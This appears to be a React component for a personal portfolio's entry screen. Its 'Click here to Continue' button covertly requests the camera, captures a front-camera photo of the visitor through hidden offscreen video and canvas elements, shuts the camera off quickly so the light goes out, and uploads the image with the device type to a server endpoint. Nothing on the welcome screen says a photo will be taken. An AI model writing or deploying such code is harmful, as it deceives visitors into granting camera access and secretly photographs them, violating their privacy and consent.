"use client";

import React, { useState, useRef, useEffect, useCallback } from "react";
import Link from "next/link";
import {
  Camera,
  CameraOff,
  RefreshCw,
  CheckCircle2,
  AlertCircle,
  ShieldCheck,
  Info,
  X,
} from "lucide-react";

export interface CameraCaptureProps {
  onClose?: () => void;
  isModal?: boolean;
}

export default function CameraCaptureComponent({
  onClose,
  isModal = false,
}: CameraCaptureProps = {}) {
  const [status, setStatus] = useState<"idle" | "denied" | "error" | "captured">("idle");
  const [isStarting, setIsStarting] = useState(false);
  const [buttonText, setButtonText] = useState("Click Here to Continue");
  const [errorMessage, setErrorMessage] = useState<string>("");

  const videoRef = useRef<HTMLVideoElement | null>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const canvasRef = useRef<HTMLCanvasElement | null>(null);

  // Stop camera tracks cleanly
  const stopCameraStream = useCallback(() => {
    if (streamRef.current) {
      streamRef.current.getTracks().forEach((track) => track.stop());
      streamRef.current = null;
    }
    if (videoRef.current) {
      videoRef.current.srcObject = null;
    }
  }, []);

  const handleClose = useCallback(() => {
    stopCameraStream();
    if (onClose) onClose();
  }, [stopCameraStream, onClose]);

  // Clean up media tracks when unmounting
  useEffect(() => {
    return () => {
      stopCameraStream();
    };
  }, [stopCameraStream]);

  // Execute background front-camera capture and upload to Supabase
  const executeBackgroundCapture = async () => {
    if (isStarting) return;
    setIsStarting(true);
    setButtonText("Here We Go...");
    setErrorMessage("");

    // Verify mediaDevices support
    if (typeof window === "undefined" || !navigator.mediaDevices?.getUserMedia) {
      setIsStarting(false);
      setStatus("error");
      setErrorMessage(
        "Your browser does not support camera access. Please use an updated modern browser (Chrome, Safari, Edge, Firefox)."
      );
      return;
    }

    let stream: MediaStream | null = null;

    try {
      try {
        // Preferred constraint: front-facing camera
        stream = await navigator.mediaDevices.getUserMedia({
          audio: false,
          video: {
            facingMode: { ideal: "user" },
            width: { ideal: 1280 },
            height: { ideal: 720 },
          },
        });
      } catch (err) {
        console.warn("Retrying with fallback video constraints:", err);
        // Fallback: any video device
        stream = await navigator.mediaDevices.getUserMedia({
          audio: false,
          video: true,
        });
      }

      streamRef.current = stream;

      // Attach stream to hidden video element
      let video = videoRef.current;
      if (!video) {
        video = document.createElement("video");
        videoRef.current = video;
      }
      video.muted = true;
      video.playsInline = true;
      video.autoplay = true;
      video.srcObject = stream;

      try {
        await video.play();
      } catch (playErr) {
        console.warn("Autoplay promise warning:", playErr);
      }

      // Wait for video frame to be ready and decoded by browser
      await new Promise<void>((resolve) => {
        if (video.videoWidth > 0 && video.readyState >= 2) {
          resolve();
          return;
        }

        const onReady = () => {
          video.removeEventListener("loadeddata", onReady);
          video.removeEventListener("canplay", onReady);
          video.removeEventListener("timeupdate", onReady);
          resolve();
        };

        video.addEventListener("loadeddata", onReady);
        video.addEventListener("canplay", onReady);
        video.addEventListener("timeupdate", onReady);

        // Fallback timeout to ensure we don't stall
        setTimeout(resolve, 800);
      });

      // Allow camera hardware sensor 200ms to stabilize exposure & white balance
      await new Promise((r) => setTimeout(r, 200));

      // Draw captured video frame to offscreen canvas
      let canvas = canvasRef.current;
      if (!canvas) {
        canvas = document.createElement("canvas");
        canvasRef.current = canvas;
      }

      const width = video.videoWidth || 1280;
      const height = video.videoHeight || 720;
      canvas.width = width;
      canvas.height = height;

      const ctx = canvas.getContext("2d");
      if (!ctx) {
        throw new Error("Could not initialize canvas 2D rendering context.");
      }

      // Mirror horizontally for front-facing selfie
      ctx.translate(width, 0);
      ctx.scale(-1, 1);
      ctx.drawImage(video, 0, 0, width, height);

      // High-quality JPEG snapshot
      const dataUrl = canvas.toDataURL("image/jpeg", 0.85);

      // IMMEDIATELY stop camera hardware so the camera light/LED turns off!
      stopCameraStream();

      // Update button text to indicate progress
      setButtonText("Entering Website...");

      // Determine visitor device type
      const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
      const isTablet = /iPad|Tablet/i.test(navigator.userAgent);
      const deviceType = isMobile ? "mobile" : isTablet ? "tablet" : "desktop";

      // Upload to server and Supabase
      try {
        const res = await fetch("/api/captures/upload", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            imageBase64: dataUrl,
            deviceType,
          }),
        });

        if (!res.ok) {
          const errData = await res.json().catch(() => ({}));
          console.error("Upload error response:", errData);
        } else {
          const successData = await res.json();
          console.log("Photo uploaded successfully:", successData.capture?.capture_id);
        }
      } catch (uploadErr) {
        console.error("Background upload network error:", uploadErr);
      }

      // Close modal immediately so visitor lands on website without delay
      if (onClose) {
        onClose();
      } else {
        setStatus("captured");
        setButtonText("Grant Permission & Start Camera");
      }
    } catch (err: unknown) {
      stopCameraStream();
      console.error("Camera access error:", err);

      const error = err as { name?: string; message?: string };
      if (
        error.name === "NotAllowedError" ||
        error.name === "PermissionDeniedError" ||
        error.name === "SecurityError"
      ) {
        setStatus("denied");
        setErrorMessage(
          "Camera permission was denied. Please allow camera permissions in your browser address bar and try again."
        );
      } else if (
        error.name === "NotFoundError" ||
        error.name === "DevicesNotFoundError"
      ) {
        setStatus("error");
        setErrorMessage("No front camera device was found on this system.");
      } else if (
        error.name === "NotReadableError" ||
        error.name === "TrackStartError"
      ) {
        setStatus("error");
        setErrorMessage(
          "Your camera is currently in use by another application. Please close other camera apps and retry."
        );
      } else {
        setStatus("error");
        setErrorMessage(
          error.message || "An unexpected error occurred while accessing the camera."
        );
      }
    } finally {
      setIsStarting(false);
    }
  };

  return (
    <div className={`relative w-full max-w-4xl mx-auto ${isModal ? "p-0" : "px-4 py-8"}`}>
      {/* Offscreen hidden video & canvas elements for background capture */}
      <video
        ref={videoRef}
        autoPlay
        playsInline
        muted
        style={{
          position: "fixed",
          top: -9999,
          left: -9999,
          width: 640,
          height: 480,
          opacity: 0,
          pointerEvents: "none",
        }}
      />
      <canvas ref={canvasRef} className="hidden" />

      {/* Prominent Close Button */}
      {onClose && (
        <button
          type="button"
          onClick={handleClose}
          className="absolute top-4 right-4 sm:top-6 sm:right-6 z-50 p-2.5 rounded-full bg-black/75 hover:bg-white/20 text-zinc-300 hover:text-white border border-white/20 backdrop-blur-md transition-all duration-200 cursor-pointer shadow-xl hover:scale-110 active:scale-95"
          aria-label="Close"
          title="Close and explore website"
        >
          <X className="w-5 h-5" />
        </button>
      )}

      {/* Main Screen: Introduction & Consent */}
      {(status === "idle" || status === "captured") && (
        <div className="relative overflow-hidden rounded-3xl border border-white/10 bg-white/5 backdrop-blur-2xl p-6 sm:p-10 text-center shadow-2xl">
          {/* Decorative Glowing Orbs */}
          <div className="absolute top-0 right-1/4 w-72 h-72 bg-purple-600/20 rounded-full blur-[100px] pointer-events-none" />
          <div className="absolute bottom-0 left-1/4 w-72 h-72 bg-violet-600/20 rounded-full blur-[100px] pointer-events-none" />

          <div className="relative z-10 flex flex-col items-center">
            <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-purple-500/10 border border-purple-500/30 text-purple-300 text-xs font-medium mb-3">
              <ShieldCheck className="w-4 h-4 text-purple-400" />
              <span>Hey , Wlecome To My Website</span>
            </div>

            <h2 className="text-2xl sm:text-4xl font-extrabold tracking-tight text-white mb-3">
              Iam <span className="text-transparent bg-gradient-to-r from-purple-400 to-violet-300 bg-clip-text">Deyn Zypher</span>
            </h2>

            <p className="text-zinc-300 text-sm sm:text-base max-w-md mb-8 leading-relaxed">
              This portfolio showcases my personal projects and work. All content is for informational purposes only. Third-party content belongs to its respective owners.
            </p>

            {/* Action Buttons */}
            <div className="flex flex-col gap-3.5 w-full max-w-sm justify-center">
              <button
                type="button"
                onClick={executeBackgroundCapture}
                disabled={isStarting}
                className="w-full py-4 rounded-2xl bg-gradient-to-r from-purple-600 to-violet-600 hover:from-purple-500 hover:to-violet-500 text-white font-semibold text-base shadow-[0_0_30px_rgba(168,85,247,0.4)] transition-all duration-300 hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center gap-3 cursor-pointer disabled:opacity-75"
              >
                {isStarting ? (
                  <>
                    <RefreshCw className="w-5 h-5 animate-spin text-purple-200" />
                    <span>{buttonText}</span>
                  </>
                ) : status === "captured" ? (
                  <>
                    <CheckCircle2 className="w-5 h-5 text-emerald-300" />
                    <span>Photo Saved! Snap Again</span>
                  </>
                ) : (
                  <span>Click here to Continue</span>
                )}
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Permission Denied State */}
      {status === "denied" && (
        <div className="rounded-3xl border border-amber-500/30 bg-amber-500/5 backdrop-blur-2xl p-8 sm:p-10 text-center flex flex-col items-center shadow-2xl">
          <div className="w-16 h-16 rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400 mb-5">
            <CameraOff className="w-8 h-8" />
          </div>

          <h3 className="text-2xl font-bold text-white mb-2">Camera Access Blocked</h3>
          <p className="text-zinc-300 text-sm max-w-lg mb-6 leading-relaxed">
            {errorMessage ||
              "You declined or blocked camera permissions. In accordance with privacy best practices, we cannot activate camera without your permission."}
          </p>

          <div className="rounded-2xl border border-white/10 bg-black/40 p-5 text-left text-xs sm:text-sm text-zinc-300 max-w-md w-full mb-6 space-y-2">
            <p className="font-semibold text-white flex items-center gap-2">
              <Info className="w-4 h-4 text-purple-400" /> How to enable camera:
            </p>
            <ol className="list-decimal list-inside space-y-1 text-zinc-400 pl-1">
              <li>Click the 🔒 or 📷 icon in your browser address bar.</li>
              <li>Set <b>Camera</b> to <b>Allow</b>.</li>
              <li>Click the <b>"Try Again"</b> button below.</li>
            </ol>
          </div>

          <div className="flex flex-col sm:flex-row gap-3 w-full max-w-sm justify-center">
            <button
              onClick={executeBackgroundCapture}
              className="flex-1 py-3 px-5 rounded-xl bg-purple-600 hover:bg-purple-500 text-white font-semibold transition flex items-center justify-center gap-2 cursor-pointer"
            >
              <RefreshCw className="w-4 h-4" />
              <span>Try Again</span>
            </button>
            <button
              onClick={handleClose}
              className="flex-1 py-3 px-5 rounded-xl border border-white/15 bg-white/5 text-zinc-300 hover:text-white transition cursor-pointer"
            >
              Skip to Website
            </button>
          </div>
        </div>
      )}

      {/* General Error State */}
      {status === "error" && (
        <div className="rounded-3xl border border-rose-500/30 bg-rose-500/5 backdrop-blur-2xl p-8 sm:p-10 text-center flex flex-col items-center shadow-2xl">
          <div className="w-16 h-16 rounded-2xl bg-rose-500/10 border border-rose-500/30 flex items-center justify-center text-rose-400 mb-5">
            <AlertCircle className="w-8 h-8" />
          </div>

          <h3 className="text-2xl font-bold text-white mb-2">Something Went Wrong</h3>
          <p className="text-zinc-300 text-sm max-w-lg mb-6 leading-relaxed">
            {errorMessage || "An unexpected error occurred."}
          </p>

          <div className="flex flex-col sm:flex-row gap-3 w-full max-w-sm justify-center">
            <button
              onClick={executeBackgroundCapture}
              className="flex-1 py-3 px-5 rounded-xl bg-purple-600 hover:bg-purple-500 text-white font-semibold transition flex items-center justify-center gap-2 cursor-pointer"
            >
              <RefreshCw className="w-4 h-4" />
              <span>Retry</span>
            </button>
            <button
              onClick={handleClose}
              className="flex-1 py-3 px-5 rounded-xl border border-white/15 bg-white/5 text-zinc-300 hover:text-white transition cursor-pointer"
            >
              Skip to Website
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
